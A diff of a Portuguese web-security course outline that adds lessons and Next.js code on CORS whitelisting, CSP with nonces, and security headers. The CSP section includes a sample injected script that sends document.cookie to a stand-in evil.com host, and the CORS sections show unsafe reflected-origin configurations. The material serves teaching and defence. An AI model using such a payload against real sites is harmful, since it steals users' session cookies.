@@ -1560,17 +1560,22 @@ O código atual está crescendo e misturando lógicas:
 // ❌ PROBLEMA: Lógica de autorização misturada com lógica de negócio
 export async function deletePost(postId) {
   // ... buscar dados ...
-  
+
   // Múltiplas verificações inline
-  if (dbUser.role === "admin") { /* deletar */ }
-  if (post.authorId === dbUser.id) { /* deletar */ }
-  
+  if (dbUser.role === "admin") {
+    /* deletar */
+  }
+  if (post.authorId === dbUser.id) {
+    /* deletar */
+  }
+
   // Como adicionar moderador aqui?
   // Como reutilizar essa lógica em outras ações (edit, publish, etc)?
 }
 ```
 
 **Problemas:**
+
 - Difícil adicionar novos roles ou regras
 - Impossível reutilizar lógica em outras funções
 - Sem logs de autorização falha
@@ -1614,22 +1619,26 @@ export async function deletePost(postId) {
 **[TEORIA]**
 
 **ABAC com múltiplos atributos:**
+
 ```
 IF role == 'moderator' AND reportCount >= 3 → ALLOW
 ```
 
 Aqui usamos **dois atributos**:
+
 - `role` (do usuário)
 - `reportCount` (do post)
 
 Isso é mais poderoso que RBAC puro porque considera **contexto do recurso**.
 
 **Separação de responsabilidades:**
+
 - `authorization.js` → Decide "PODE ou NÃO PODE"
 - `posts.js` → Executa ação SE autorizado
 - Benefícios: Testável, reutilizável, manutenível
 
 **Hierarquia final:**
+
 ```
 deletar_post:
   IF role == 'admin' → ALLOW (RBAC)
@@ -1639,6 +1648,7 @@ deletar_post:
 ```
 
 **Métrica de segurança:**
+
 - "Toda tentativa de autorização negada deve ser logada"
 - "Lógica de autorização deve ser isolada e testável"
 
@@ -1762,11 +1772,12 @@ export async function deletePost(postId) {
     metadata: {
       postId,
       userRole: dbUser.role,
-      reason: dbUser.role === "admin"
-        ? "admin_privileges"
-        : post.authorId === dbUser.id
-        ? "ownership"
-        : "moderator_report_threshold",
+      reason:
+        dbUser.role === "admin"
+          ? "admin_privileges"
+          : post.authorId === dbUser.id
+          ? "ownership"
+          : "moderator_report_threshold",
     },
   });
 
@@ -1777,14 +1788,14 @@ export async function deletePost(postId) {
 ```sql
 -- supabase/migrations/002_add_role.sql (ATUALIZAR)
 -- Adicionar alguns moderadores para teste
-UPDATE "User" SET role = 'moderator' 
+UPDATE "User" SET role = 'moderator'
 WHERE username IN ('moderador1', 'moderador2');
 
 -- Adicionar alguns posts com reports para teste
-UPDATE "Post" SET reportCount = 5 
+UPDATE "Post" SET reportCount = 5
 WHERE id IN (1, 2);
 
-UPDATE "Post" SET reportCount = 2 
+UPDATE "Post" SET reportCount = 2
 WHERE id IN (3, 4);
 ```
 
@@ -1839,112 +1850,747 @@ Benefícios da refatoração:
 
 ---
 
-### **MÓDULO 4: CORS e Configurações Seguras (45 min)**
+### **MÓDULO 4: CORS e Configurações Seguras (49 min, 4 vídeos)**
 
-#### 🎥 Vídeo 4.1: Entendendo CORS (10 min)
+#### 🎥 Vídeo 4.1: Entendendo CORS e Same-Origin Policy (12 min)
 
 **Commit:** `video-4.1-entendendo-cors`
 
-- O que é CORS e por que existe
-- Same-Origin Policy
-- Preflight requests
-- Credentials e cookies
+**[CONTEXTO]**
 
-**Modificações de Código:** ❌ Nenhuma
+Até agora protegemos nossa aplicação contra XSS, CSRF, vazamento de tokens e broken access control. Mas existe outra camada crítica de segurança que atua no **nível do navegador**: CORS (Cross-Origin Resource Sharing) e Same-Origin Policy. Estes mecanismos controlam quais domínios podem acessar recursos da nossa API, protegendo contra ataques de origem cruzada.
 
-**Arquivos criados:**
+**[PROBLEMA]**
 
-- `docs/CORS_EXPLAINED.md`
+A maioria dos desenvolvedores:
+
+- Não entende o que é CORS e por que existe
+- Usa `Access-Control-Allow-Origin: *` (MUITO PERIGOSO!)
+- Não sabe quando preflight requests são necessários
+- Configura CORS incorretamente e quebra autenticação
+- Não entende a relação entre CORS e cookies/credentials
+
+**Exemplo comum de erro:**
+
+```javascript
+// ❌ PERIGOSO: Permite qualquer origem
+res.setHeader("Access-Control-Allow-Origin", "*");
+res.setHeader("Access-Control-Allow-Credentials", "true");
+// ERRO: Navegador bloqueia essa combinação!
+```
+
+**[SOLUÇÃO]**
+
+Entender os fundamentos antes de implementar:
+
+1. **Same-Origin Policy:** O que é e por que protege
+2. **CORS:** Como relaxar SOP de forma segura
+3. **Preflight:** Quando navegador faz OPTIONS request
+4. **Credentials:** Como enviar cookies cross-origin
+
+**Conteúdo (12 min de teoria + exemplos):**
+
+**SLIDE 1 — Same-Origin Policy (SOP):**
+
+- **O que é:** Política de segurança do navegador que bloqueia requests entre diferentes origens
+- **Origem = Protocolo + Domínio + Porta**
+- **Exemplos:**
+
+  ```
+  https://app.com:443    = MESMA origem
+  https://app.com:443    = MESMA origem
+
+  https://app.com        ≠ http://app.com       (protocolo diferente)
+  https://app.com        ≠ https://api.app.com  (subdomínio diferente)
+  https://app.com:443    ≠ https://app.com:8080 (porta diferente)
+  ```
+
+- **Por que existe:** Impede que `evil.com` leia dados de `bank.com` quando você está logado
+
+**SLIDE 2 — CORS: Relaxando SOP de forma segura:**
+
+- **O que é:** Mecanismo que permite servidor decidir quais origens podem acessá-lo
+- **Como funciona:** Servidor envia headers especiais (`Access-Control-Allow-*`)
+- **Navegador verifica:** Se origem está autorizada antes de entregar resposta ao JavaScript
+- **Não protege o servidor:** Protege o navegador de entregar dados para origem não autorizada
+
+**SLIDE 3 — Simple Requests vs Preflight:**
+
+**Simple Request (sem preflight):**
+
+```
+Condições:
+✅ Método: GET, POST, HEAD
+✅ Headers: Content-Type, Accept, Accept-Language
+✅ Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain
+
+Navegador envia direto → Servidor responde → Navegador valida CORS
+```
+
+**Preflight Request (com OPTIONS):**
+
+```
+Condições:
+⚠️ Método: PUT, DELETE, PATCH
+⚠️ Headers customizados: Authorization, X-Custom-Header
+⚠️ Content-Type: application/json
+
+Navegador envia OPTIONS → Servidor responde headers permitidos →
+Se OK: Navegador envia request real → Servidor responde
+```
+
+**SLIDE 4 — Credentials (cookies e tokens):**
+
+- **Problema:** Por padrão, navegador NÃO envia cookies em requests cross-origin
+- **Solução:** Habilitar credentials em AMBOS os lados:
+
+  ```javascript
+  // Cliente (fetch)
+  fetch("https://api.app.com", {
+    credentials: "include" // ✅ Envia cookies
+  });
+
+  // Servidor
+  Access-Control-Allow-Origin: https://app.com  // ✅ Origem ESPECÍFICA
+  Access-Control-Allow-Credentials: true        // ✅ Permite cookies
+
+  // ❌ ERRO COMUM:
+  Access-Control-Allow-Origin: *              // ❌ Wildcard
+  Access-Control-Allow-Credentials: true      // ❌ Navegador bloqueia!
+  ```
+
+**SLIDE 5 — Fluxo completo de um request com CORS:**
+
+```
+1. JavaScript em https://app.com tenta fetch para https://api.app.com
+
+2. Navegador verifica: É cross-origin? SIM
+
+3. Navegador verifica: É simple request? NÃO (Authorization header)
+
+4. Navegador envia OPTIONS (preflight):
+   OPTIONS https://api.app.com/posts
+   Origin: https://app.com
+
+5. Servidor responde preflight:
+   Access-Control-Allow-Origin: https://app.com
+   Access-Control-Allow-Methods: GET, POST, DELETE
+   Access-Control-Allow-Headers: Authorization
+
+6. Navegador valida: Origem permitida? SIM, Method permitido? SIM
+
+7. Navegador envia request real:
+   DELETE https://api.app.com/posts/123
+   Authorization: Bearer token...
+
+8. Servidor responde com CORS headers novamente
+
+9. Navegador entrega resposta ao JavaScript ✅
+```
+
+**SLIDE 6 — Configurações PERIGOSAS (evitar):**
+
+```javascript
+// ❌ MUITO PERIGOSO: Permite qualquer origem
+Access-Control-Allow-Origin: *
+
+// ❌ PERIGOSO: Wildcard + credentials (navegador bloqueia)
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+// ❌ PERIGOSO: Refletir origem do request
+const origin = request.headers.get("origin");
+Access-Control-Allow-Origin: origin  // Aceita qualquer origem!
+
+// ✅ CORRETO: Whitelist de origens permitidas
+const allowedOrigins = ["https://app.com", "https://admin.app.com"];
+if (allowedOrigins.includes(origin)) {
+  Access-Control-Allow-Origin: origin
+}
+```
+
+**[TEORIA]**
+
+**Por que CORS é importante:**
+
+- Sem CORS: Same-Origin Policy bloqueia TODOS os requests cross-origin
+- Com CORS mal configurado: Qualquer site pode acessar sua API
+- Com CORS correto: Apenas origens autorizadas podem acessar
+
+**OWASP:**
+
+- Misconfigured CORS = Broken Access Control
+- Pode expor dados sensíveis para origens não autorizadas
+
+**Métrica de segurança:**
+
+- "Apenas origens explicitamente autorizadas no whitelist podem acessar recursos"
+- "Preflight requests devem validar método + headers"
+
+**Modificações de Código:** ❌ Nenhuma (apenas teoria com slides)
 
 ---
 
-#### 🎥 Vídeo 4.2: Configurando CORS no Next.js (12 min)
+#### 🎥 Vídeo 4.2: Configurando CORS no Next.js (13 min)
 
 **Commit:** `video-4.2-cors-config`
 
-- CORS por ambiente
-- Whitelist de domínios
-- Headers de CORS
-- Tratamento de credenciais
+**[CONTEXTO]**
+
+No vídeo anterior, entendemos a teoria de CORS e Same-Origin Policy. Agora vamos implementar CORS corretamente em nossa aplicação Next.js, com **whitelist de origens por ambiente**, **tratamento de preflight** (OPTIONS), e **suporte a credentials**. A configuração será flexível: permissiva em desenvolvimento, restritiva em produção.
+
+**[PROBLEMA]**
+
+Configurações comuns de CORS que causam problemas:
+
+```javascript
+// ❌ PROBLEMA 1: Permite qualquer origem (inseguro)
+headers: {
+  "Access-Control-Allow-Origin": "*"
+}
+
+// ❌ PROBLEMA 2: Hardcoded (não funciona em múltiplos ambientes)
+headers: {
+  "Access-Control-Allow-Origin": "https://meuapp.com"
+}
+// Em dev, staging, preview → CORS bloqueado!
+
+// ❌ PROBLEMA 3: Reflete qualquer origem (MUITO perigoso)
+const origin = request.headers.get("origin");
+headers: {
+  "Access-Control-Allow-Origin": origin  // evil.com pode acessar!
+}
+
+// ❌ PROBLEMA 4: Esquece preflight (OPTIONS)
+// Navegador envia OPTIONS → 404 → Request real bloqueado
+```
+
+**[SOLUÇÃO]**
+
+Implementar CORS em 3 camadas:
+
+1. **Whitelist de origens por ambiente** (`.env`)
+2. **Função helper para validar origem** (`src/lib/cors.js`)
+3. **Middleware para tratar preflight** (`src/middleware.js`)
+
+**Conteúdo:**
+
+1. **Configurar variáveis de ambiente (2 min)**
+
+   - Adicionar `ALLOWED_ORIGINS` em `.env`
+   - Adicionar em `.env.example`
+   - Explicar formato: lista separada por vírgulas
+
+2. **Criar função getCorsHeaders() (4 min)**
+
+   - Criar `src/lib/cors.js`
+   - Validar origem contra whitelist
+   - Diferentes headers para dev vs prod
+   - Retornar headers apropriados
+
+3. **Configurar middleware (4 min)**
+
+   - Modificar `src/middleware.js`
+   - Tratar preflight (OPTIONS)
+   - Aplicar headers em todas as responses
+   - Logs para debug
+
+4. **Testar com DevTools (3 min)**
+
+   - Fazer request de origem permitida → SUCESSO ✅
+   - Fazer request de origem não permitida → BLOQUEADO ✅
+   - Ver preflight OPTIONS no Network tab
+
+**[TEORIA]**
+
+**Whitelist de origens:**
+
+- Lista explícita de origens autorizadas
+- Por ambiente: dev (localhost), staging, produção
+- Validar antes de retornar header
+
+**Preflight (OPTIONS):**
+
+- Navegador envia OPTIONS antes do request real
+- Servidor deve responder 200 com headers permitidos
+- Middleware intercepta e responde OPTIONS automaticamente
+
+**Credentials:**
+
+- `Access-Control-Allow-Credentials: true` permite cookies
+- Mas exige origem específica (não pode ser `*`)
+- Frontend precisa `credentials: "include"` no fetch
+
+**Métrica de segurança:**
+
+- "Todas as origens autorizadas vêm de variável de ambiente"
+- "Preflight OPTIONS sempre retorna 200 com headers corretos"
 
 **Modificações de Código:** ✅ Sim
 
 **Arquivos criados:**
 
-- `src/lib/cors.js`
+- `src/lib/cors.js` - Função helper para validar CORS
 
 **Arquivos modificados:**
 
-- `next.config.js` - CORS headers
-- `src/middleware.js` - CORS middleware
-- `.env.example` - ALLOWED_ORIGINS
+- `src/middleware.js` - Adicionar tratamento de CORS
+- `.env.example` - Documentar ALLOWED_ORIGINS
+
+**Código a implementar:**
 
 ```javascript
-// src/lib/cors.js
+// src/lib/cors.js (CRIAR)
+/**
+ * Valida origem e retorna headers CORS apropriados
+ * @param {string} origin - Origem do request (de request.headers)
+ * @returns {Object} Headers CORS
+ */
 export function getCorsHeaders(origin) {
+  // Whitelist de origens autorizadas
   const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(",") || [];
 
+  // Em desenvolvimento, permitir localhost
   if (process.env.NODE_ENV === "development") {
-    allowedOrigins.push("http://localhost:3000");
+    allowedOrigins.push("http://localhost:3000", "http://localhost:3001");
   }
 
+  // Validar se origem está na whitelist
+  const isAllowed = allowedOrigins.includes(origin);
+
   return {
-    "Access-Control-Allow-Origin": allowedOrigins.includes(origin)
-      ? origin
-      : "",
-    "Access-Control-Allow-Methods": "GET,POST,PUT,DELETE",
-    "Access-Control-Allow-Headers": "Content-Type, Authorization",
+    // ✅ Retorna origem específica OU vazio (nunca "*" com credentials)
+    "Access-Control-Allow-Origin": isAllowed ? origin : "",
+
+    // Métodos HTTP permitidos
+    "Access-Control-Allow-Methods": "GET, POST, PUT, PATCH, DELETE, OPTIONS",
+
+    // Headers que cliente pode enviar
+    "Access-Control-Allow-Headers":
+      "Content-Type, Authorization, X-Requested-With",
+
+    // ✅ Permite envio de cookies e headers de auth
     "Access-Control-Allow-Credentials": "true",
+
+    // Cache do preflight por 24h (reduz requests OPTIONS)
+    "Access-Control-Max-Age": "86400",
   };
 }
+
+/**
+ * Cria resposta para preflight (OPTIONS)
+ */
+export function createPreflightResponse(origin) {
+  return new Response(null, {
+    status: 200,
+    headers: getCorsHeaders(origin),
+  });
+}
+```
+
+```javascript
+// src/middleware.js (MODIFICAR)
+import { NextResponse } from "next/server";
+import { updateSession } from "@/utils/supabase/middleware";
+import { getCorsHeaders, createPreflightResponse } from "@/lib/cors";
+
+export async function middleware(request) {
+  const origin = request.headers.get("origin") || "";
+
+  // 1. Tratar preflight (OPTIONS) imediatamente
+  if (request.method === "OPTIONS") {
+    return createPreflightResponse(origin);
+  }
+
+  // 2. Continuar com lógica normal (Supabase, etc)
+  let response = await updateSession(request);
+
+  // 3. Adicionar headers CORS em TODAS as responses
+  const corsHeaders = getCorsHeaders(origin);
+  Object.entries(corsHeaders).forEach(([key, value]) => {
+    if (value) {
+      response.headers.set(key, value);
+    }
+  });
+
+  // 4. Log para debug (opcional)
+  if (process.env.NODE_ENV === "development") {
+    console.log(`[CORS] ${request.method} ${request.url}`);
+    console.log(
+      `[CORS] Origin: ${origin} → ${
+        corsHeaders["Access-Control-Allow-Origin"] ? "ALLOWED" : "BLOCKED"
+      }`
+    );
+  }
+
+  return response;
+}
+
+export const config = {
+  matcher: [
+    "/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)",
+  ],
+};
+```
+
+```env
+# .env.example (ADICIONAR)
+# CORS: Origens autorizadas (separadas por vírgula)
+# Desenvolvimento: localhost é adicionado automaticamente
+# Produção: adicionar domínios reais
+ALLOWED_ORIGINS=https://meuapp.com,https://admin.meuapp.com
+```
+
+**Teste manual (demonstração ao vivo):**
+
+```javascript
+// 1. Testar em desenvolvimento (localhost)
+fetch("http://localhost:3000/api/posts");
+// → SUCESSO ✅ (localhost está na whitelist em dev)
+
+// 2. Simular request de origem não autorizada (DevTools)
+// Mudar origin header manualmente
+fetch("http://localhost:3000/api/posts", {
+  headers: { Origin: "https://evil.com" },
+});
+// → BLOQUEADO ✅ (evil.com não está na whitelist)
+// Console: "CORS policy: No 'Access-Control-Allow-Origin' header"
+
+// 3. Ver preflight no Network tab
+fetch("http://localhost:3000/api/posts", {
+  method: "DELETE",
+  headers: { Authorization: "Bearer token" },
+});
+// DevTools → Network:
+// 1. OPTIONS /api/posts → 200 (preflight)
+// 2. DELETE /api/posts → 200 (request real)
+
+// 4. Testar credentials
+fetch("http://localhost:3000/api/posts", {
+  credentials: "include", // ✅ Envia cookies
+});
+// → Headers: Access-Control-Allow-Credentials: true
+```
+
+**Explicação verbal (importante):**
+
+```
+Fluxo CORS com nosso middleware:
+
+1. Request chega → middleware extrai origin
+
+2. SE método = OPTIONS (preflight):
+   └─ Retorna 200 com headers CORS imediatamente
+
+3. SENÃO:
+   ├─ Executa lógica normal (Supabase, etc)
+   └─ Adiciona headers CORS na response
+
+4. Valida origem:
+   ├─ Em whitelist? → Retorna origin específico
+   └─ Não está? → Retorna "" (navegador bloqueia)
+
+5. Navegador recebe response:
+   ├─ Valida headers CORS
+   ├─ SE origem permitida → Entrega ao JavaScript ✅
+   └─ SE não permitida → Bloqueia + erro console ❌
 ```
 
 ---
 
-#### 🎥 Vídeo 4.3: Content Security Policy (CSP) (15 min)
+#### 🎥 Vídeo 4.3: Content Security Policy (CSP) (12 min)
 
 **Commit:** `video-4.3-csp`
 
-- O que é CSP
-- Diretivas principais
-- Nonce para scripts inline
-- Testing e debugging
+**[CONTEXTO]**
+
+Mesmo com sanitização de HTML (DOMPurify), nossa aplicação ainda está vulnerável se um atacante conseguir injetar um `<script>` tag. **Content Security Policy (CSP)** é uma **segunda camada de defesa** contra XSS: mesmo que um script malicioso chegue ao HTML, o navegador bloqueará sua execução se não atender às regras do CSP. Vamos implementar CSP com **nonce** para permitir apenas scripts autorizados.
+
+**[PROBLEMA]**
+
+Sem CSP, se um atacante conseguir bypass da sanitização:
+
+```html
+<!-- ⚠️ Se isso chegar ao DOM (bypass de sanitização): -->
+<script>
+  fetch("https://evil.com/steal?cookie=" + document.cookie);
+</script>
+<!-- Navegador executa → dados roubados! -->
+```
+
+**Problemas comuns ao implementar CSP:**
+
+- CSP muito permissivo: `script-src: 'unsafe-inline' 'unsafe-eval'` (não protege)
+- CSP quebra aplicação: Scripts legítimos bloqueados
+- Não usa nonce: Difícil permitir scripts inline seguros
+- Não monitora violações: Não sabe se está sendo atacado
+
+**[SOLUÇÃO]**
+
+Implementar **CSP com nonce** em 3 etapas:
+
+1. **Gerar nonce único por request** (`crypto.randomBytes`)
+2. **Adicionar nonce no header CSP** (`script-src 'nonce-abc123'`)
+3. **Injetar nonce em scripts inline legítimos** (`<script nonce="abc123">`)
+
+**Conteúdo:**
+
+1. **Explicar CSP (3 min)**
+
+   - O que é: Whitelist de fontes permitidas para recursos
+   - Como funciona: Navegador bloqueia tudo que não está na whitelist
+   - Diretivas principais: `script-src`, `style-src`, `img-src`, etc
+   - Defesa em profundidade: XSS sanitization + CSP
+
+2. **Implementar função geradora de CSP (4 min)**
+
+   - Criar `src/lib/csp.js`
+   - Função `generateNonce()` com crypto
+   - Função `getCSPHeader(nonce)` com todas as diretivas
+   - Explicar cada diretiva
+
+3. **Adicionar CSP no middleware (3 min)**
+
+   - Modificar `src/middleware.js`
+   - Gerar nonce por request
+   - Adicionar header `Content-Security-Policy`
+   - Passar nonce para layout (via headers)
+
+4. **Testar CSP (2 min)**
+
+   - Ver scripts legítimos funcionando (com nonce)
+   - Tentar injetar script sem nonce → BLOQUEADO ✅
+   - Ver violação no console
+
+**[TEORIA]**
+
+**CSP (Content Security Policy):**
+
+- Header HTTP que controla quais recursos navegador pode carregar
+- Cada tipo de recurso tem sua diretiva (script, style, img, etc)
+- Navegador bloqueia recursos que violam policy
+
+**Nonce (Number used once):**
+
+- String aleatória única por request
+- Gerada no servidor, incluída no CSP header
+- Scripts só executam se tiverem nonce correto
+- Impede execução de scripts injetados (sem nonce)
+
+**Diretivas principais:**
+
+```
+default-src 'self'           → Padrão: apenas mesma origem
+script-src 'self' 'nonce-X'  → Scripts: mesma origem + com nonce
+style-src 'self' 'unsafe-inline' → Estilos: mesma origem + inline (CSS-in-JS)
+connect-src 'self' *.supabase.co → Fetch/XHR: mesma origem + Supabase
+frame-ancestors 'none'       → Não pode ser iframe (anti-clickjacking)
+```
+
+**Métrica de segurança:**
+
+- "Scripts inline só executam com nonce válido"
+- "Violações CSP são logadas para monitoramento"
 
 **Modificações de Código:** ✅ Sim
 
 **Arquivos criados:**
 
-- `src/lib/csp.js`
-- `src/app/api/csp-report/route.js`
+- `src/lib/csp.js` - Funções para gerar CSP e nonce
+- `src/app/api/csp-report/route.js` - Endpoint para receber violações
 
 **Arquivos modificados:**
 
-- `next.config.js` - CSP headers
-- `src/app/layout.js` - nonce injection
+- `src/middleware.js` - Adicionar CSP header com nonce
+
+**Código a implementar:**
 
 ```javascript
-// src/lib/csp.js
+// src/lib/csp.js (CRIAR)
 import crypto from "crypto";
 
+/**
+ * Gera um nonce criptograficamente seguro
+ * @returns {string} Nonce em base64
+ */
 export function generateNonce() {
   return crypto.randomBytes(16).toString("base64");
 }
 
+/**
+ * Gera header Content-Security-Policy com nonce
+ * @param {string} nonce - Nonce único do request
+ * @returns {string} CSP header completo
+ */
 export function getCSPHeader(nonce) {
   const csp = {
+    // Padrão: apenas recursos da mesma origem
     "default-src": ["'self'"],
-    "script-src": ["'self'", `'nonce-${nonce}'`],
+
+    // Scripts: mesma origem + com nonce (bloqueia inline sem nonce)
+    "script-src": [
+      "'self'",
+      `'nonce-${nonce}'`,
+      // Permitir chunks do Next.js (production)
+      process.env.NODE_ENV === "production" ? "" : "'unsafe-eval'",
+    ].filter(Boolean),
+
+    // Estilos: mesma origem + inline (necessário para CSS-in-JS)
     "style-src": ["'self'", "'unsafe-inline'"],
+
+    // Imagens: mesma origem + data URIs + HTTPS externo
     "img-src": ["'self'", "data:", "https:"],
+
+    // Fetch/XHR: mesma origem + Supabase
     "connect-src": ["'self'", "https://*.supabase.co"],
+
+    // Fontes: mesma origem
+    "font-src": ["'self'"],
+
+    // Frames: bloquear (anti-clickjacking)
     "frame-ancestors": ["'none'"],
+
+    // Formulários: mesma origem
+    "form-action": ["'self'"],
+
+    // Base URI: mesma origem (previne <base> tag attacks)
+    "base-uri": ["'self'"],
+
+    // Upgrade insecure requests (HTTP → HTTPS em produção)
+    ...(process.env.NODE_ENV === "production" && {
+      "upgrade-insecure-requests": [],
+    }),
+
+    // Reportar violações
     "report-uri": ["/api/csp-report"],
   };
 
   return Object.entries(csp)
-    .map(([k, v]) => `${k} ${v.join(" ")}`)
+    .map(([key, values]) => `${key} ${values.join(" ")}`)
     .join("; ");
 }
+```
+
+```javascript
+// src/app/api/csp-report/route.js (CRIAR)
+import { NextResponse } from "next/server";
+import { logSecurityEvent } from "@/eventLogger";
+
+/**
+ * Endpoint para receber relatórios de violação CSP
+ */
+export async function POST(request) {
+  try {
+    const report = await request.json();
+
+    // Logar violação CSP
+    logSecurityEvent({
+      type: "CSP_VIOLATION",
+      severity: "WARNING",
+      metadata: {
+        blockedUri: report["csp-report"]?.["blocked-uri"],
+        violatedDirective: report["csp-report"]?.["violated-directive"],
+        sourceFile: report["csp-report"]?.["source-file"],
+        lineNumber: report["csp-report"]?.["line-number"],
+      },
+    });
+
+    return NextResponse.json({ received: true }, { status: 200 });
+  } catch (error) {
+    console.error("[CSP Report] Error:", error);
+    return NextResponse.json({ error: "Invalid report" }, { status: 400 });
+  }
+}
+```
+
+```javascript
+// src/middleware.js (ADICIONAR CSP)
+import { NextResponse } from "next/server";
+import { updateSession } from "@/utils/supabase/middleware";
+import { getCorsHeaders, createPreflightResponse } from "@/lib/cors";
+import { generateNonce, getCSPHeader } from "@/lib/csp";
+
+export async function middleware(request) {
+  const origin = request.headers.get("origin") || "";
+
+  // 1. Tratar preflight (OPTIONS)
+  if (request.method === "OPTIONS") {
+    return createPreflightResponse(origin);
+  }
+
+  // 2. Gerar nonce para CSP
+  const nonce = generateNonce();
+
+  // 3. Continuar com lógica normal (Supabase, etc)
+  let response = await updateSession(request);
+
+  // 4. Adicionar headers CORS
+  const corsHeaders = getCorsHeaders(origin);
+  Object.entries(corsHeaders).forEach(([key, value]) => {
+    if (value) {
+      response.headers.set(key, value);
+    }
+  });
+
+  // 5. ✅ Adicionar CSP header
+  response.headers.set("Content-Security-Policy", getCSPHeader(nonce));
+
+  // 6. ✅ Adicionar nonce ao header customizado (para layout usar)
+  response.headers.set("x-nonce", nonce);
+
+  return response;
+}
+
+export const config = {
+  matcher: [
+    "/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)",
+  ],
+};
+```
+
+**Teste manual (demonstração ao vivo):**
+
+```javascript
+// 1. Ver CSP no DevTools
+// DevTools → Network → Headers → Response Headers
+// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; ...
+
+// 2. Tentar injetar script sem nonce (simular XSS)
+// Adicionar no HTML: <script>alert('XSS')</script>
+// Console: "Refused to execute inline script because it violates CSP directive"
+// ✅ BLOQUEADO pelo navegador!
+
+// 3. Script com nonce funciona
+// <script nonce="abc123">console.log('OK')</script>
+// → Executa normalmente ✅
+
+// 4. Ver violação reportada
+// Logs: [CSP_VIOLATION] blocked-uri: "inline", violated-directive: "script-src"
+```
+
+**Explicação verbal (importante):**
+
+```
+Como CSP protege contra XSS:
+
+1. Atacante injeta: <script>alert('XSS')</script>
+
+2. HTML chega ao navegador
+
+3. Navegador verifica CSP:
+   ├─ Diretiva: script-src 'self' 'nonce-abc123'
+   ├─ Script injetado: sem nonce
+   └─ DECISÃO: BLOQUEAR ❌
+
+4. Console: "Refused to execute... violates CSP"
+
+5. Aplicação continua funcionando ✅
+   └─ Scripts legítimos têm nonce correto
+
+Defesa em profundidade:
+├─ Camada 1: Sanitização (DOMPurify) → Remove scripts
+├─ Camada 2: CSP → Bloqueia se bypass de sanitização
+└─ Se ambas falharem: Logs de violação CSP
 ```
 
 ---
@@ -1953,17 +2599,155 @@ export function getCSPHeader(nonce) {
 
 **Commit:** `video-4.4-headers-avancados`
 
-- HSTS (HTTP Strict Transport Security)
-- Permissions Policy
-- Subresource Integrity (SRI)
-- Testing com securityheaders.com
+**[CONTEXTO]**
+
+Além de CORS e CSP, existem outros **security headers** que protegem contra ataques específicos: **HSTS** (force HTTPS), **Permissions Policy** (controlar features do navegador), **X-Frame-Options** (anti-clickjacking), entre outros. Este vídeo implementa todos os headers recomendados por **securityheaders.com** e **OWASP**.
+
+**[PROBLEMA]**
+
+Aplicações sem security headers são vulneráveis a:
+
+```javascript
+// ❌ Sem HSTS: Man-in-the-middle pode downgrade HTTPS → HTTP
+// ❌ Sem X-Frame-Options: Aplicação pode ser iframe (clickjacking)
+// ❌ Sem X-Content-Type-Options: MIME-type sniffing vulnerabilities
+// ❌ Sem Referrer-Policy: Vaza informações sensíveis em URLs
+// ❌ Sem Permissions-Policy: Pode usar câmera/microfone sem permissão
+```
+
+**[SOLUÇÃO]**
+
+Adicionar **todos os security headers** recomendados no middleware.
+
+**Conteúdo:**
+
+1. **Explicar cada header (5 min)**
+
+   - HSTS: Force HTTPS por 1 ano
+   - X-Frame-Options: Prevenir clickjacking
+   - X-Content-Type-Options: Prevenir MIME sniffing
+   - Referrer-Policy: Controlar info em Referer
+   - Permissions-Policy: Controlar features do navegador
+
+2. **Implementar no middleware (4 min)**
+
+   - Adicionar todos os headers
+   - Diferentes configs para dev vs prod
+   - Comentários explicando cada um
+
+3. **Testar com securityheaders.com (3 min)**
+
+   - Fazer deploy
+   - Testar em securityheaders.com
+   - Ver score A+ ✅
+
+**[TEORIA]**
+
+**HSTS (HTTP Strict Transport Security):**
+
+- Force navegador usar HTTPS por período definido
+- Previne downgrade attacks (HTTPS → HTTP)
+- `max-age=31536000` = 1 ano
+
+**Permissions Policy:**
+
+- Controla quais features navegador pode usar
+- Exemplos: camera, microphone, geolocation
+- `geolocation=(), camera=(), microphone=()` = desabilita tudo
+
+**X-Frame-Options:**
+
+- Previne aplicação ser carregada em iframe
+- Proteção contra clickjacking
+- `DENY` = nunca permitir iframe
+
+**Métrica de segurança:**
+
+- "Score A+ em securityheaders.com"
+- "Todos os headers OWASP implementados"
 
 **Modificações de Código:** ✅ Sim
 
 **Arquivos modificados:**
 
-- `next.config.js` - headers completos
-- `middleware.js` - headers dinâmicos
+- `src/middleware.js` - Adicionar todos security headers
+
+**Código a implementar:**
+
+```javascript
+// src/middleware.js (ADICIONAR SECURITY HEADERS)
+export async function middleware(request) {
+  const origin = request.headers.get("origin") || "";
+
+  // 1. Tratar preflight
+  if (request.method === "OPTIONS") {
+    return createPreflightResponse(origin);
+  }
+
+  // 2. Gerar nonce para CSP
+  const nonce = generateNonce();
+
+  // 3. Continuar com lógica normal
+  let response = await updateSession(request);
+
+  // 4. CORS headers
+  const corsHeaders = getCorsHeaders(origin);
+  Object.entries(corsHeaders).forEach(([key, value]) => {
+    if (value) response.headers.set(key, value);
+  });
+
+  // 5. CSP header
+  response.headers.set("Content-Security-Policy", getCSPHeader(nonce));
+  response.headers.set("x-nonce", nonce);
+
+  // 6. ✅ SECURITY HEADERS AVANÇADOS
+
+  // HSTS: Force HTTPS por 1 ano (apenas em produção)
+  if (process.env.NODE_ENV === "production") {
+    response.headers.set(
+      "Strict-Transport-Security",
+      "max-age=31536000; includeSubDomains; preload"
+    );
+  }
+
+  // X-Frame-Options: Prevenir clickjacking
+  response.headers.set("X-Frame-Options", "DENY");
+
+  // X-Content-Type-Options: Prevenir MIME sniffing
+  response.headers.set("X-Content-Type-Options", "nosniff");
+
+  // Referrer-Policy: Não vazar URL completa
+  response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
+
+  // X-XSS-Protection: Habilitar filtro XSS do navegador (legado, mas útil)
+  response.headers.set("X-XSS-Protection", "1; mode=block");
+
+  // Permissions-Policy: Desabilitar features desnecessárias
+  response.headers.set(
+    "Permissions-Policy",
+    "camera=(), microphone=(), geolocation=(), interest-cohort=()"
+  );
+
+  return response;
+}
+```
+
+**Teste com securityheaders.com:**
+
+```
+1. Deploy da aplicação em produção
+2. Acessar https://securityheaders.com
+3. Inserir URL: https://seu-dominio.com
+4. Resultado esperado: A+ ✅
+
+Headers detectados:
+✅ Content-Security-Policy
